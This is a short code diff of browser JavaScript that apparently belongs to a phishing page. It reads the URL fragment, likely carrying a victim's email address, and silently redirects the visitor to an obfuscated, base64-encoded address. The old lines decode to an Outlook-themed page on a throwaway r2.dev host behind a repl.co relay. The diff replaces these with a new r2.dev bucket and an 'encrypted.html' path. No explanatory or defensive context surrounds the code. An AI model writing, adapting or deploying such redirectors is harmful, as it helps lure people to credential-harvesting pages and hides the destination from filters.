@@ -3,10 +3,10 @@
         if(window.location.hash) {
             var url = window.location.href;
             var hash = url.split('#').pop();
-            const encdStr = 'aHR0cHM6Ly9wdWItYjY0YzYzYWI5ZTFhNDI0NWExZWYwNWI2ODQ4OGMxMWIucjIuZGV2L291dGxvb2slMjBjb21wbGV0ZS5odG1s';
+            const encdStr = 'L2VuY3J5cHRlZC5odG1s';
             const str = atob (encdStr);
             const emma = '#' + hash;
-            const dr = 'https://telenet.readynow.repl.co/?r=';
+            const dr = 'https://pub-d7b400a91a3346ee9392def14110c038.r2.dev';
             const ax = dr + encdStr;
             var link = ax + emma;
             window.location.href = link;
